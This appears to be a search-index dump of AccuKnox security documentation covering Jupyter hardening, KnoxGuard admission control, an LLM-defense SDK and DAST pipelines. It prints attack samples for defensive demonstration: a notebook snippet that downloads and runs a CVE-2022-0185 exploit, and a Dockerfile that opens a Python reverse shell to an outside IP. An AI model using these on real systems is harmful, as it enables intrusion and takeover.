</ul>"},{"location":"use-cases/jenkins-secret-scan/#configuration","title":"Configuration","text":""},{"location":"use-cases/jenkins-secret-scan/#job-configuration","title":"Job Configuration","text":"<ol> <li> <p>Add Build Step:</p> </li> <li> <p>Open the Jenkins job configuration.</p> </li> <li> <p>Under the Build section, click Add build step and select AccuKnox Secret Scan.</p> </li> </ol> <p></p> <ol> <li> <p>Configure Plugin Parameters:</p> </li> <li> <p>The plugin provides the following configuration options:</p> <ul> <li> <p>Token: AccuKnox API token for authentication.</p> </li> <li> <p>Tenant ID: Your AccuKnox tenant ID.</p> </li> <li> <p>Label: A label to associate the scan with specific context.</p> </li> <li> <p>Endpoint: AccuKnox API endpoint.</p> </li> <li> <p>Results Path: Path to save TruffleHog results (default: <code>trufflehog-results.json</code>).</p> </li> <li> <p>Fail on Secrets: Mark the build as failed if secrets are detected.</p> </li> <li> <p>Branch: The branch of the repository to scan.</p> </li> <li> <p>Exclude Paths: Paths to exclude from the scan.</p> </li> <li> <p>Additional Arguments: Custom arguments to pass to TruffleHog.</p> </li> </ul> </li> </ol> <p></p>"},{"location":"use-cases/jenkins-secret-scan/#running-the-scan","title":"Running the Scan","text":"<ol> <li> <p>Execution:</p> </li> <li> <p>Once configured, trigger the Jenkins job.</p> </li> <li> <p>The plugin:</p> <ul> <li> <p>Runs a Secret scan in the workspace.</p> </li> <li> <p>Saves the results to the specified path.</p> </li> <li> <p>If secrets are found, uploads the results to AccuKnox CSPM.</p> </li> </ul> </li> <li> <p>Sample Console Output:</p> </li> </ol> <pre><code>Starting AccuKnox Secret Scan...\nAccuKnox Secret Scan is running...\nSecrets found. Uploading results to AccuKnox CSPM...\nAccuKnox CSPM upload successful.\n</code></pre>"},{"location":"use-cases/jenkins-secret-scan/#troubleshooting","title":"Troubleshooting","text":""},{"location":"use-cases/jenkins-secret-scan/#1-no-results-found","title":"1. No Results Found","text":"<ul> <li> <p>If no secrets are detected:</p> </li> <li> <p>Verify that the source repository contains test secrets.</p> </li> <li> <p>Check the excluded paths and branch configuration.</p> </li> </ul>"},{"location":"use-cases/jenkins-secret-scan/#2-api-upload-failure","title":"2. API Upload Failure","text":"<ul> <li> <p>Verify the AccuKnox API endpoint is correctly configured.</p> </li> <li> <p>Ensure the AccuKnox Token and Tenant ID are accurate.</p> </li> <li> <p>Check network connectivity to the AccuKnox SaaS endpoint.</p> </li> </ul>"},{"location":"use-cases/jenkins-secret-scan/#3-command-errors","title":"3. Command Errors","text":"<ul> <li> <p>Ensure the TruffleHog Docker image is accessible from the Jenkins environment.</p> </li> <li> <p>Check workspace permissions and Docker installation.</p> </li> </ul>"},{"location":"use-cases/jenkins-secret-scan/#example-configuration","title":"Example Configuration","text":"Parameter Example Value Token <code>my-accuknox-token</code> Tenant ID <code>my-tenant-id</code> Label <code>secret-scan-build-123</code> Endpoint <code>https://api.accuknox.com</code> Results Path <code>trufflehog-results.json</code> Branch <code>main</code> Exclude Paths <code>node_modules, tests</code> Additional Args <code>--regex --max-depth 2</code>"},{"location":"use-cases/jenkins-secret-scan/#token-generation-for-accuknox","title":"Token Generation for AccuKnox","text":"<p>To generate the AccuKnox Token and obtain the Tenant ID:</p> <ol> <li> <p>Log in to AccuKnox.</p> </li> <li> <p>Navigate to Settings &gt; Tokens and create an AccuKnox token.</p> </li> <li> <p>Copy the generated token and store it securely for later use. For detailed steps, refer to How to Create Tokens.</p> </li> </ol>"},{"location":"use-cases/jenkins-secret-scan/#conclusion","title":"Conclusion","text":"<p>By integrating the AccuKnox Secret Scanning Jenkins Plugin into your CI/CD pipeline, you ensure that sensitive information is identified and securely managed during development. The plugin streamlines secret scanning, centralizes findings in AccuKnox SaaS, and helps strengthen your organization's security posture.</p>"},{"location":"use-cases/jupyter-notebook/","title":"Jupyter Notebook","text":"<p>JupyterHub brings the power of notebooks to groups of users. It gives users access to computational environments and resources without burdening the users with installation and maintenance tasks. While this is a great model, attackers, or unethical users might take undue advantage of this model. The very nature of the Jupyter notebook is to allow users to do remote command/code execution.</p> <p>Remote Command Injection is just the start. Left unchecked, the attacker can gain unauthorized access to the kubernetes resources, exfiltrate data and mount supply chain attacks to name a few.</p> <p></p>"},{"location":"use-cases/jupyter-notebook/#insecure-shell","title":"Insecure Shell","text":"<p>On a shell of jupyter notebook, any of the binaries are allowed to execute by default. If we try to execute some system binaries, it is observed that there is no restriction to do so. For example, consider the <code>killall5</code> system binary.</p> <p></p> <p>Executing <code>killall5</code> in Jupyter notebook isn\u2019t restricted. The binary terminates all running processes and even affects the kubernetes environment as we can observe the pod getting restarted as the container crashes.</p> <p></p>"},{"location":"use-cases/jupyter-notebook/#remote-code-injection","title":"Remote Code Injection","text":"<p>Jupyter notebook by nature allows remote code injection and execution of binaries from any source. To demonstrate this, an exploit for CVE-2022-0185 can be used as provided below:</p> <pre><code>!touch exploit\nimport urllib.request\nurllib.request.urlretrieve(\"https://github.com/nyrahul/CVE-2022-0185/raw/master/exploit\", \"exploit\")\n!chmod +x exploit\n!./exploit\n</code></pre> <p>On running the above in the notebook, we can see the exploit binary getting executed without any resistance.</p> <p></p> <p>Such an open environment is not desirable and AccuKnox can help with restricting this behavior by the use of KubeArmor policies.</p>"},{"location":"use-cases/jupyter-notebook/#attack-prevention","title":"Attack Prevention","text":"<p>The following policy can be used to protect the Jupyter Notebook:</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: protect-jupyter\n  namespace: jupyter\nspec:\n  selector:\n    matchLabels:\n      app: jupyterhub\n      component: singleuser-server\n  network:\n    matchProtocols:\n    - fromSource:\n      - path: /usr/local/bin/python3.11\n      protocol: udp\n    - fromSource:\n      - path: /usr/local/bin/python3.11\n      protocol: tcp\n  file:\n    matchDirectories:\n    - dir: /\n      recursive: true\n    - dir: /usr/local/bin/\n      readOnly: true\n    - dir: /bin/\n      readOnly: true\n    - dir: /usr/bin/\n      readOnly: true\n  process:\n    matchDirectories:\n    - dir: /usr/local/bin/\n    - dir: /usr/bin/\n    - dir: /bin/\n  action: Allow\n</code></pre> <p>The above KubeArmor policy</p> <ul> <li> <p>Allows only python to use network primitives</p> </li> <li> <p>Allows only read access to <code>/usr/local/bin/</code> and <code>/bin/</code> folders</p> </li> <li> <p>Allows execution only from <code>/usr/local/bin/</code> and <code>/bin/</code> folders</p> </li> </ul>"},{"location":"use-cases/jupyter-notebook/#preventing-exploitation-by-using-accuknox-zero-trust-cnapp","title":"Preventing exploitation by using AccuKnox Zero Trust CNAPP","text":"<p>Step 1:  To create the policy Navigate to Runtime Protection \u2192 Policies. Then select Create Policy option from the screen.</p> <p></p> <p>Step 2: In the policy editor tool create/upload the above policy. Select the Cluster, namespace, save and then select Save to workspace option.</p> <p></p> <p>Step 3: Apply the policy by clicking on the three dots next to the saved policy and selecting Apply Policy.</p> <p></p> <p>Step 4: Since this is an allow based policy, to effectively make use of it, we\u2019ll need to set the default posture to block.</p> <ul> <li>Step 4.1: Navigate to Inventory \u2192 Cloud Workloads. Select the cluster that has jupyterhub deployed and click on View Workloads</li> </ul> <p></p> <ul> <li>Step 4.2: Click on info at the top of the namespace where jupyterhub is deployed. Then select Edit in the pop up that opens</li> </ul> <p></p> <ul> <li>Step 4.3: Click on the slider to the left of Process/File to shift to the default deny mode. A green popup appears on successful update.</li> </ul> <p></p> <p>Step 5: Now try executing <code>!killall5</code> in the jupyter notebook instance.</p> <p>Try downloading and executing the exploit of CVE-2022-0185 with the script that was introduced above.</p> <p></p> <p>Alerts are generated for the attempts to exploit:</p> <pre><code>root:\n  Action:Block\n  ClusterName:gke-demo\n  ContainerID:36e9a4bcf13b3e72aac683dc864414f7d122792b9f8d734f8b230a588cdfdb05\n  ContainerImage:quay.io/jupyterhub/k8s-singleuser-sample:3.3.5@sha256:a839b70b9061119ef4117f37f25133d68294c764ae1c1048726c3e65b809d8eb\n  ContainerName:notebook\n  Cwd:/\n  Data:lsm=SECURITY_BPRM_CHECK\n  Enforcer:BPFLSM\n  HostName:gke-do-637-cluster-pool-1-6a8519c6-d7x3\n  HostPID:3410014\n  HostPPID:3410013\n  Labels:hub.jupyter.org/servername=,hub.jupyter.org/username=user1,release=jupyter-release,app=jupyterhub,chart=jupyterhub-3.3.5,component=singleuser-server,heritage=jupyterhub,hub.jupyter.org/network-access-hub=true\n  NamespaceName:jupyter\n  Operation:Process\n  Owner:\n    Name:jupyter-user1\n    Namespace:jupyter\n    Ref:Pod\n  PID:49\n  PPID:48\n  ParentProcessName:/bin/dash\n  PodName:jupyter-user1\n  PolicyName:DefaultPosture\n  ProcessName:/home/jovyan/exploit\n  Resource:/home/jovyan/exploit\n  Result:Permission denied\n  Source:/bin/dash\n  Timestamp:1712060619\n  Type:MatchedPolicy\n  UID:1000\n  cluster_id:25444\n  component_name:kubearmor\n  instanceGroup:0\n  instanceID:0\n  workload:1\n</code></pre> <p>The result is permission denied for both as the policy applied does not allow any process to execute other than the ones present in <code>/usr/local/bin</code>, <code>/usr/bin/</code> and <code>/bin/</code> directories. In addition, since the policy also prevents write to these directories, the jupyter environment is shielded from execution of malicious code by attackers.</p>"},{"location":"use-cases/kiem/","title":"Kubernetes Identity and Entitlement Management (KIEM)","text":"<p>KIEM addresses Kubernetes identity and entitlement security challenges by providing continuous visibility, event detection, and centralized permissions management. Designed for dynamic, auto-scaling infrastructures, it offers deep RBAC policy analysis and visualization. AccuKnox's solution is critical given that 65% of Kubernetes administrators struggle with policy configuration, enabling robust security in complex Kubernetes environments. By offering deep visibility, powerful analysis tools, and intuitive visualizations, KIEM empowers administrators to maintain robust security postures in even the most complex Kubernetes environments.</p>"},{"location":"use-cases/kiem/#key-features","title":"Key Features","text":"<ul> <li>Full-text Search: Search across all RBAC entities, including service accounts and role bindings.</li> <li>Interactive Graph Visualization: Visualize connections between users, permissions, and resources with interactive graphs.</li> <li>Predefined Queries: Handy built-in queries to identify critical issues like unnecessary privileges.</li> <li>Custom Filtering: Continuously monitor and filter access configurations and changes.</li> <li>Simplified Access Control Management: Streamline the complex task of managing Kubernetes access control and permissions.</li> </ul>"},{"location":"use-cases/kiem/#onboarding-process","title":"Onboarding Process","text":"<p>Follow these steps to set up and start using AccuKnox KIEM:</p>"},{"location":"use-cases/kiem/#install-kiem-agents","title":"Install KIEM Agents","text":"<ol> <li>Navigate to the \"Manage Cluster\" section in your AccuKnox dashboard.</li> <li>Select the target cluster for KIEM installation.</li> <li>Install the KIEM job on the selected cluster.</li> <li>Set up and schedule the cron job for regular scans.</li> </ol>"},{"location":"use-cases/kiem/#post-onboarding-steps","title":"Post-Onboarding Steps","text":"<p>After completing the onboarding process:</p> <ol> <li>Wait for the initial KIEM cron job to complete its first scan.</li> <li>Once the scan is finished, navigate to the \"Identity &gt; KIEM\" section in your dashboard.</li> <li>Review the initial findings and adjust configurations as necessary.</li> </ol>"},{"location":"use-cases/kiem/#kiem-features","title":"KIEM Features","text":""},{"location":"use-cases/kiem/#permissions-overview","title":"Permissions Overview","text":"<ul> <li>Summarizes all permissions in a unified view.</li> <li>Rolebinding and workloads are connected to permissions.</li> <li>Filter on constraints such as Role, Resource, ApiGroup, Verbs, Rolebinding, Service Accounts, Workload.</li> <li>View distilled permission summary for filtered entities.</li> </ul>"},{"location":"use-cases/kiem/#key-queries","title":"Key Queries","text":"<p>Our KIEM solution includes predefined queries that can detect security risks, misconfigurations, or compliance issues within Kubernetes RBAC configurations. With 15 built-in queries, you can better address common security concerns. These queries can detect dormant excess permissions, principals with excessive privileges, roles with permissions on workload resources modification, and list roles with read access to Kubernetes secrets, not in use. These prebuilt queries aid in maintaining Kubernetes RBAC configurations with security as a primary factor.</p> <p>Examples:</p> <ul> <li> <p>Identify Service Accounts not connected to any workloads (indicator of dormant excessive permissions).</p> </li> <li> <p>Identify principals with excessive privileges. Excessive privileges in Kubernetes can increase the risk of security breaches, as overprivileged users or processes can misuse their access, leading to data breaches, service disruptions, or unauthorized changes in the cluster.</p> </li> <li> <p>Find roles that have permissions to modify workload resources. Excessive access rights to Kubernetes workload resources can lead to security vulnerabilities, allowing unauthorized access or modifications to critical applications and data, undermining the cluster's security posture.</p> </li> <li> <p>List roles that have read access to Kubernetes secrets. Kubernetes secrets, often containing sensitive information like passwords, tokens, or encryption keys, can pose a significant security risk if read access to these roles is compromised, potentially leading to data leakage or unauthorized system access.</p> </li> <li> <p>Identify roles that are not in use. Unused roles can pose security risks if not regularly audited and cleaned up, potentially accumulating unnecessary permissions or becoming a target for exploitation by attackers.</p> </li> </ul> <p></p>"},{"location":"use-cases/kiem/#full-text-search","title":"Full-text Search","text":"<p>Search across all RBAC entities:</p> <ul> <li>ServiceAccounts</li> <li>RoleBindings</li> <li>Roles And more</li> </ul> <p></p>"},{"location":"use-cases/kiem/#entity-exploration","title":"Entity Exploration","text":"<ul> <li>View connections and manifest for select entities.</li> <li>Discover excessive permissions.</li> </ul> <ul> <li>Explore all RBAC entities:<ul> <li>Service Accounts</li> <li>Users</li> <li>Groups</li> <li>Roles</li> <li>RoleBindings</li> </ul> </li> </ul>"},{"location":"use-cases/kiem/#interactive-visualization","title":"Interactive Visualization","text":"<p>Open any entity and view all its connections by clicking on the link.</p> <p></p>"},{"location":"use-cases/kiem/#use-case-navigating-rbac-complexities","title":"Use Case: Navigating RBAC Complexities","text":"<p>While Kubernetes RBAC provides powerful access management capabilities, it can become complex in large or dynamic environments. AccuKnox KIEM addresses these challenges through:</p> <ul> <li>Intuitive Visualization: Graphically represent RBAC relationships for easier understanding.</li> <li>Powerful Search: Quickly find and analyze specific permissions or entities.</li> <li>Pre-defined Security Checks: Automatically identify common misconfigurations or security risks.</li> <li>Continuous Monitoring: Track changes to RBAC configurations in real-time.</li> <li>Compliance Mapping: Align RBAC policies with industry standards and best practices.</li> </ul> <p>By leveraging these features, administrators can effectively manage relationships between key entities, monitor configuration changes, and ensure a more secure Kubernetes environment, all while reducing the complexity typically associated with RBAC management.</p> <p>Info</p> <p>For more details, refer AccuKnox KIEM Blog</p>"},{"location":"use-cases/knoxguard-supply-chain/","title":"Mitigate Supply Chain Attacks with KnoxGuard","text":"<p>As Kubernetes adoption continues to surge, securing your Kubernetes clusters becomes critical. And the Kubernetes security is incomplete without the admission controllers. An admission controller in Kubernetes is a component that intercepts the Kubernetes API requests to validate, modify, or reject them based on defined policies before they are applied to the cluster.</p> <p>This document showcases the impact of using container images from unknown container registries. The scenario involves a container registry controlled by an attacker, leading to a remote code execution via a supply chain attack. It also outlines how you can secure your Kubernetes cluster from such supply chain attacks.</p>"},{"location":"use-cases/knoxguard-supply-chain/#scenario-before-using-the-knoxguard","title":"Scenario before using the KnoxGuard","text":"<p>A developer deploys an nginx container using this Kuberentes manifest:</p> <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: nginx\n  name: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: ttl.sh/nginx:24h\n        name: nginx\n</code></pre> <p>At first glance, this Kubernetes manifest doesn't look malicious at all. But if you look closely, its using <code>ttl.sh/nginx:24h</code> image to create the container. It's not a standard nginx image from the Docker Hub. In fact this image is controlled by an attacker and it contains the code to get a reverse shell. The developer had made a mistake here and deployed the nginx container using a malicious image from an untrusted registry.</p> <p>Here is the Dockerfile of that malicious image:</p> <pre><code># Use the official NGINX image as a base\nFROM nginx:latest\n\n# Install Python3 (required for the reverse shell)\nRUN apt-get update &amp;&amp; apt-get install -y python3 &amp;&amp; apt-get clean\n\n# Command to run both the NGINX server and the reverse shell\nCMD bash -c \"python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"3.110.37.227\\\",1337)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\\\"/bin/bash\\\")' &amp; nginx -g 'daemon off;'\"\n</code></pre> <p>You can see that it have a python command that spawns up the reverse shell on the attacker's machine.</p> <p>The attacker uses the netcat to listen for this reverse shell connection.</p> <pre><code>ubuntu@ip-172-31-11-62:~$ nc -lvnp 1337\nListening on 0.0.0.0 1337\n</code></pre> <p>The attacker immediately gets the reverse shell once the container is deployed.</p> <pre><code>&gt; kubectl apply -f deployment.yaml -n demo\ndeployment.apps/nginx created\n</code></pre> <p></p> <p>Now the attacker have full access to the container! Attacker can perform network requests from the container, leak your source code, mine cryptocurrencies, or even get access to database credentials from the environment variables!</p>"},{"location":"use-cases/knoxguard-supply-chain/#scenario-after-using-knoxguard","title":"Scenario after using KnoxGuard","text":"<p>You can use KnoxGuard to defend against such supply chain attacks. Before installing the KnoxGuard make sure that the Kubernetes cluster is onboarded to the AccuKnox control plane, and all AccuKnox agents are in the running state:</p> <pre><code>userx@fedora:~$ kubectl get pods -n accuknox-agents\nNAME                                      READY   STATUS    RESTARTS           AGE\nagents-operator-d8585d594-55s29           1/1     Running   0                  72d\ndiscovery-engine-59c69ff787-scrrj         4/4     Running   0                  72d\nfeeder-service-765d8f7d65-d4vq2           1/1     Running   13 (2d21h ago)     4d\npolicy-enforcement-agent-f5c5f87b-9fw79   1/1     Running   84 (2d21h ago)     40d\nshared-informer-agent-77569db588-c944p    1/1     Running   1090 (2m36s ago)   40d\n</code></pre> <p>After ensuring that agents are in the running state you can install KnoxGuard by the following commands:</p> <pre><code>helm repo add kyverno https://kyverno.github.io/kyverno/\nhelm repo update\nhelm install kyverno kyverno/kyverno -n kyverno --create-namespace\nhelm upgrade --install knoxguard oci://public.ecr.aws/k9v9d5v2/knoxguard-chart --version=v0.2.0 -n knoxguard --create-namespace\n</code></pre> <p>Once the KnoxGuard is installed create a file <code>policy.yaml</code> and paste the following content into the file.</p> <pre><code>apiVersion: admission.accuknox.com/v1\nkind: AdmissionPolicy\nmetadata:\n  labels:\n    app.kubernetes.io/name: admission-controller\n  name: use-trusted-regestries\nspec:\n  registries:\n    action: Block\n    include:\n    - pattern: docker.io/*\n      namespace: demo\n</code></pre> <p>For applying the policy, open up the AccuKnox control plane. Navigate to the runtime protection &gt; policies and click on the create policy button.</p> <p></p> <p>Select your cluster, upload the policy and click on the save button.</p> <p></p> <p>It will ask you for a confirmation, click on the active policies checkbox and click on the confirm button.</p> <p></p> <p>After applying the policy, KnoxGuard will block the deployments that use images from untrusted registries.</p> <p></p>"},{"location":"use-cases/knoxguard-supply-chain/#summary","title":"Summary","text":"<p>Using untrusted container registries can lead to significant security risks, including remote code execution and unauthorized access. KnoxGuard provides an effective solution by enforcing security policies that block malicious deployments, helping to secure the cluster and prevent supply chain attacks. Implementing KnoxGuard admission controller ensures a more robust and safer Kubernetes environment.</p>"},{"location":"use-cases/kspm/","title":"Kubernetes Security Posture Management with AccuKnox","text":""},{"location":"use-cases/kspm/#kspm-kubernetes-security-posture-management","title":"KSPM (Kubernetes Security Posture Management)","text":"<p>Admission Controller</p> <p>KIEM</p> <p>Pod Security Admission Controller</p> <p>CIS K8s Benchmark Findings</p> <p>Workload Hardening</p> <p>Runtime Application Hardening</p> <p>Network Microsegmentation</p> <p>Cluster Misconfiguration</p> <p>Prevent Supply Chain Attacks with KnoxGuard</p> <ul> <li>KSPM provides a security framework for Kubernetes, continuously assessing configurations and detecting misconfigurations to prevent security breaches.</li> <li>Delivers agentless Kubernetes security with compliance monitoring, risk management, and real-time alerting.</li> <li>Serves as a critical security layer when integrated with Cloud Workload Protection Platforms (CWPP), offering multi-layered defense across containerized environments by providing visibility and proactive risk management.</li> </ul> <p>Info</p> <p>For more details, refer KSPM on AccuKnox Website</p>"},{"location":"use-cases/llm-defense-app-onboard/","title":"Onboard LLM Defense App","text":""},{"location":"use-cases/llm-defense-app-onboard/#steps-to-get-started","title":"Steps to Get Started","text":""},{"location":"use-cases/llm-defense-app-onboard/#1-add-application","title":"1. Add Application","text":"<p>Click on \"Add Application\" as shown below.</p> <p></p> <p>Enter the Application Name and Tags, then click the Add button.</p> <p> Enter the application details.</p>"},{"location":"use-cases/llm-defense-app-onboard/#2-save-your-token","title":"2. Save Your Token","text":"<p>Copy the Accuknox_token and store it securely for later use.</p> <p> Copy the API token shown on the screen.</p>"},{"location":"use-cases/llm-defense-app-onboard/#3-install-the-sdk","title":"3. Install the SDK","text":"<p>Inside the environment where your application is running, install the package:</p> <pre><code>pip install accuknox-llm-defense\n</code></pre> <p>For more details, see the PyPI project page.</p>"},{"location":"use-cases/llm-defense-app-onboard/#4-initialize-the-client","title":"4. Initialize the Client","text":"<p>Import the package and initialize the client with the token you obtained earlier:</p> <pre><code>from accuknox_llm_defense import LLMDefenseClient\n\naccuknox_client = LLMDefenseClient(\n    llm_defense_api_key=\"&lt;Accuknox_token&gt;\",\n    user_info=\"&lt;Enter your email/name&gt;\"\n)\n</code></pre> <p>Parameters:</p> <ul> <li><code>llm_defense_api_key</code>: Your Accuknox token</li> <li><code>user_info</code>: User information (e.g., email)</li> </ul>"},{"location":"use-cases/llm-defense-app-onboard/#5-prompt-scanning","title":"5. Prompt Scanning","text":"<p>Scan a prompt before sending it to your LLM:</p> <pre><code>prompt = \"&lt;Pass the prompt to be sent to LLM&gt;\"\nsanitized_prompt = accuknox_client.scan_prompt(content=prompt)\n</code></pre> <p>Parameters:</p> <ul> <li><code>content</code>: The prompt to be scanned before sending to the LLM.</li> </ul>"},{"location":"use-cases/llm-defense-app-onboard/#6-response-scanning","title":"6. Response Scanning","text":"<p>Scan the response received from your LLM:</p> <pre><code>response = \"&lt;Response received from LLM&gt;\"\naccuknox_client.scan_response(\n    content=response,\n    prompt=sanitized_prompt.get(\"sanitized_content\"),\n    session_id=sanitized_prompt.get(\"session_id\")\n)\n</code></pre> <p>Parameters:</p> <ul> <li><code>content</code>: The response obtained from the LLM.</li> <li><code>prompt</code>: The sanitized prompt used to generate the response.</li> <li><code>session_id</code>: The session ID obtained during prompt scanning.</li> </ul> <p>Important</p> <p>The <code>session_id</code> is used to link a prompt and its corresponding response. If you don't provide it, prompts and responses will be treated as separate findings.</p>"},{"location":"use-cases/llm-defense-app-onboard/#ai-security-use-case","title":"AI Security Use Case","text":""},{"location":"use-cases/mfa-dast/","title":"MFA-Enabled Application DAST Scan","text":""},{"location":"use-cases/mfa-dast/#objective","title":"Objective","text":"<p>To showcase how to run a Dynamic Application Security Testing (DAST) scan on an MFA-enabled application using GitHub CI/CD workflows. The OWASP Juice Shop, a deliberately vulnerable application, is used as a reference to demonstrate the process and analyze the findings effectively.</p>"},{"location":"use-cases/mfa-dast/#scenario","title":"Scenario","text":"<p>You are implementing Multi-Factor Authentication (MFA) to secure access to an application. As part of the CI/CD pipeline, you want to integrate a DAST scan using AccuKnox to identify potential vulnerabilities and evaluate the results for improved application security.</p>"},{"location":"use-cases/mfa-dast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>GitHub Actions are enabled for the repository.</p> </li> <li> <p>AccuKnox Platform Access</p> </li> <li> <p>MFA configured for the demo application.</p> </li> </ul>"},{"location":"use-cases/mfa-dast/#steps","title":"Steps","text":""},{"location":"use-cases/mfa-dast/#setting-the-stage","title":"Setting the Stage","text":"<p>We'll focus on implementing the credentials flow with Multi-Factor Authentication (MFA) for the OWASP Juice Shop application, which has MFA enabled.</p> <p>To authenticate with the OWASP Juice Shop, a POST request is sent with the user's email and password. After submitting the credentials, the system prompts for a Time-Based One-Time Password (TOTP).</p> <p></p> <p>An authorization token is issued once the TOTP is verified, allowing authenticated access for further interactions.</p> <p></p>"},{"location":"use-cases/mfa-dast/#configuring-accuknox-for-cicd-integration","title":"Configuring AccuKnox for CI/CD Integration","text":"<p>Step 1: Log in to AccuKnox Navigate to Settings and select Tokens to create an AccuKnox token for forwarding scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p> <p>Step 2: Navigate to the Labels section in Settings and create a label to categorize and identify your scan results. For step-by-step guidance, see How to Create Labels.</p> <p>Once tokens and labels are set up, you're ready to integrate them into the CI/CD pipeline.</p>"},{"location":"use-cases/mfa-dast/#pipeline-for-accuknox-dast-integration","title":"Pipeline for AccuKnox DAST Integration","text":"<p>In Jenkins, create a secret text credential with the ID <code>ACCUKNOX_TOKEN</code> to store the AccuKnox API token. This credential will be used in the pipeline for authentication when uploading scan results to the AccuKnox platform.</p> <p>The pipeline performs DAST scanning. Once the scan is completed, the results are uploaded to the AccuKnox platform for further analysis and reporting.</p> <pre><code>pipeline {\n    agent any\n    environment {\n        TOKEN = credentials('ACCUKNOX_TOKEN')\n        END_POINT = 'cspm.demo.accuknox.com'\n        TENANT_ID = '167'\n        LABEL = 'SPOC'\n    }\n    stages {\n        stage('Checkout Repository') {\n            steps {\n                git 'https://github.com/safeer-accuknox/mfa-dast-integration-accuknox'  // Replace with your repository URL\n            }\n        }\n        stage('Run Python container for updating MFA') {\n            steps {\n                script {\n                    sh '''\n                    docker run -d -it --name pythonmfa --rm -v workspace/Accuknox-DAST:/wrk/:rw python:3.11-slim /bin/bash -c \"pip install --no-cache-dir pyotp &amp;&amp; python /wrk/scripts/mfa-gen.py\"\n                    '''\n                }\n            }\n        }\n        stage('Run ZAP container') {\n            steps {\n                script {\n                    sh '''\n                    docker run --rm --cpus=\"8\" --memory=\"8g\" --name dastscan -v workspace/Accuknox-DAST:/zap/wrk/:rw -u zap -i ghcr.io/zaproxy/zaproxy:stable zap.sh -addoninstall communityScripts -addoninstall jython -loglevel debug -cmd -autorun /zap/wrk/config-mfa.yaml\n                    '''\n                }\n            }\n        }\n        stage('Upload Scan Results') {\n            steps {\n                script {\n                    sh '''\n                    curl --location --request POST \"https://${END_POINT}/api/v1/artifact/?tenant_id=${TENANT_ID}&amp;data_type=ZAP&amp;label_id=${LABEL}&amp;save_to_s3=false\" --header \"Tenant-Id: ${TENANT_ID}\" --header \"Authorization: Bearer ${TOKEN}\" --form 'file=@\"report.json\"'\n                    '''\n                }\n            }\n        }\n        stage('Cleanup') {\n            steps {\n                script {\n                    sh '''\n                    docker ps -a -q -f name=pythonmfa | xargs -r docker stop | xargs -r docker rm\n                    '''\n                    sh '''\n                    docker ps -a -q -f name=dastscan | xargs -r docker stop | xargs -r docker rm\n                    '''\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"use-cases/mfa-dast/#view-results-in-accuknox-saas","title":"View Results in AccuKnox SaaS","text":"<p>Step 1: After the pipeline completes, navigate to the AccuKnox SaaS dashboard.</p> <p>Step 2: Go to Issues &gt; Findings and select DAST Findings to see identified vulnerabilities.</p> <p></p> <p>Step 3: Click on a vulnerability to view more details.</p> <p></p> <p>Step 4: Fix the Vulnerability</p> <p>Follow the instructions in the Solutions tab to fix the vulnerability</p> <p></p> <p>Step 5: Create a Ticket for Fixing the Vulnerability</p> <p>Create a ticket in your issue-tracking system to address the identified vulnerability.</p> <p></p> <p>Step 6: Review Updated Results</p> <ul> <li> <p>After fixing the vulnerability, rerun the Jenkins CI/CD pipeline.</p> </li> <li> <p>Navigate to the AccuKnox SaaS dashboard and verify that the vulnerability has been resolved.</p> </li> </ul>"},{"location":"use-cases/mfa-dast/#conclusion","title":"Conclusion","text":"<p>The integration of AccuKnox with CI/CD pipelines, including the DAST scan on MFA-enabled applications, strengthens security by identifying vulnerabilities early in the development lifecycle. By combining MFA updates with dynamic application security testing (DAST), the pipeline ensures that security risks in authenticated applications are addressed before deployment..</p>"},{"location":"use-cases/modelarmor-adverserial-attacks/","title":"ModelArmor Use Case: Adversarial Attacks on Deep Learning Models","text":"<p>Adversarial attacks exploit vulnerabilities in AI systems by subtly altering input data to mislead the model into incorrect predictions or decisions. These perturbations are often imperceptible to humans but can significantly degrade the system's performance.</p>"},{"location":"use-cases/modelarmor-adverserial-attacks/#types-of-adversarial-attacks","title":"Types of Adversarial Attacks","text":"<ol> <li>By Model Access:<ul> <li>White-box Attacks: Complete knowledge of the model, including architecture and training data.</li> <li>Black-box Attacks: No information about the model; the attacker probes responses to craft inputs.</li> </ul> </li> <li>By Target Objective:<ul> <li>Non-targeted Attacks: Push input to any incorrect class.</li> <li>Targeted Attacks: Force input into a specific class.</li> </ul> </li> </ol>"},{"location":"use-cases/modelarmor-adverserial-attacks/#attack-phases","title":"Attack Phases","text":"<ol> <li>Training Phase Attacks:<ul> <li>Data Poisoning: Injects malicious data into the training set, altering model behavior.</li> <li>Backdoor Attacks: Embeds triggers in training data that activate specific responses during inference.</li> </ul> </li> <li>Inference Phase Attacks:<ul> <li>Model Evasion: Gradually perturbs input to skew predictions (e.g., targeted misclassification).</li> <li>Membership Inference: Exploits model outputs to infer sensitive training data (e.g., credit card numbers).</li> </ul> </li> </ol>"},{"location":"use-cases/modelarmor-adverserial-attacks/#observations-on-model-robustness","title":"Observations on Model Robustness","text":"<p>Highly accurate models often exhibit reduced robustness against adversarial perturbations, creating a tradeoff between accuracy and security. For instance, Chen et al. found that better-performing models tend to be more sensitive to adversarial inputs.</p> <p></p>"},{"location":"use-cases/modelarmor-adverserial-attacks/#defense-strategies","title":"Defense Strategies","text":"<ol> <li>Pre-analysis: Test models for prompt injection vulnerabilities using techniques like fuzzing.</li> <li>Input Sanitation:<ul> <li>Validation: Enforce strict input rules (e.g., character and data type checks).</li> <li>Filtering: Strip malicious scripts or fragments.</li> <li>Encoding: Convert special characters to safe representations.</li> </ul> </li> <li>Secure Practices for Model Deployment:<ul> <li>Restrict model permissions.</li> <li>Regularly update libraries to patch vulnerabilities.</li> <li>Detect injection attempts with specialized tooling.</li> </ul> </li> </ol>"},{"location":"use-cases/modelarmor-adverserial-attacks/#case-study-pickle-injection-vulnerability","title":"Case Study: Pickle Injection Vulnerability","text":"<p>Python's <code>pickle</code> module allows serialization and deserialization but lacks security checks. Attackers can exploit this to execute arbitrary code using crafted payloads. The module\u2019s inherent insecurity makes it risky to use with 